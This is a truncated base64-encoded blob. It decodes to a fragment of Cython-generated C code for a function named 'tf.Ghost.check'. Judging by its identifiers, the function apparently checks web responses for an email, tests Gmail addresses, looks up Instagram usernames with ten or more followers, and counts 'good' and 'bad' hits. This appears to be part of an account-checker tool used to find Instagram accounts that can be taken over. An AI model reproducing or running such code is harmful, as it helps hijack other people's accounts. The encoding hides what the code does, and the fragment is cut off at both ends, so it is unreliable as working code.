B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lb3V0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAsIF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNCk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgfQogICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF8xMDsKICAgICAgX19weXhfdF8xMCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX3B5eF90XzE0ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X2VtYWlsLCBfX3B5eF90XzEwLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBpZiAoX19weXhfdF8xNCkgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzE0ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dtYWlsX2NvbSwgX19weXhfdl9lbWFpbCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzE0IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19weXhfdF8xNCkgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9zZWxmOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF92X2VtYWlsfTsKICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVja19nbWFpbCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDIwOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBnb3RvIF9fcHl4X0wxMDsKICAgICAgICB9CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X2VtYWlsOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTsKICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF8xMCwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF82OwogICAgICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgX19weXhfdF8xNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfdl91c2VybmFtZSwgX19weXhfdF82LCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBpZiAoX19weXhfdF8xNCkgewoKICAgICAgICAgICAgCiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfdl91c2VybmFtZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgCiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgIF9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICAgICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgCiAgICAgICAgICAgIF9fcHl4X3RfNiA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxNiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzE0IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjE2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIGlmIChfX3B5eF90XzE0KSB7CgogICAgICAgICAgICAgIAogICAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kaWd9OwogICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3Zfc2VsZjsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xMCwgX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Vua25vd259OwogICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDMtX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxMjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgCiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3Zfc2VsZjsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZpbHRlcmVkfTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIyMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfTDEyOjsKCiAgICAgICAgICAgIAogICAgICAgICAgICBnb3RvIF9fcHl4X0wxMTsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICAgICB7CiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTsKICAgICAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgewogICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmlsdGVyZWR9OwogICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X0wxMTo7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wxMDo7CgogICAgICAgIAogICAgICAgIGdvdG8gX19weXhfTDk7CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfZ219OwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjI0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgfQogICAgICBfX3B5eF9MOTo7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDsKICAgIF9fcHl4X0wzX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgX19weXhfdF8xNSA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTsKICAgIGlmIChfX3B5eF90XzE1KSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuY2hlY2siLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF8xMCwgJl9fcHl4X3RfNCkgPCAwKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTA7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfNyA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyMjYsIF9fcHl4X0wxOF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF84ID0gX19weXhfdl9zZWxmOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbX07CiAgICAgICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjI3LCBfX3B5eF9MMThfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIHsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MMTk7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wxOF9lcnJvcjo7CiAgICAgICAgewogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDsgX19weXhfdF8yMSA9IDA7IF9fcHl4X3RfMjIgPSAwOyBfX3B5eF90XzIzID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzIxLCAmX19weXhfdF8yMiwgJl9fcHl4X3RfMjMpOwogICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTgsICZfX3B5eF90XzE5LCAmX19weXhfdF8yMCkgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTgsICZfX3B5eF90XzE5LCAmX19weXhfdF8yMCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIyKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMyk7CiAgICAgICAgICBfX3B5eF90XzE1ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzE2ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8xNyA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMik7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIzKTsKICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMjEsIF9fcHl4X3RfMjIsIF9fcHl4X3RfMjMpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOCk7CiAgICAg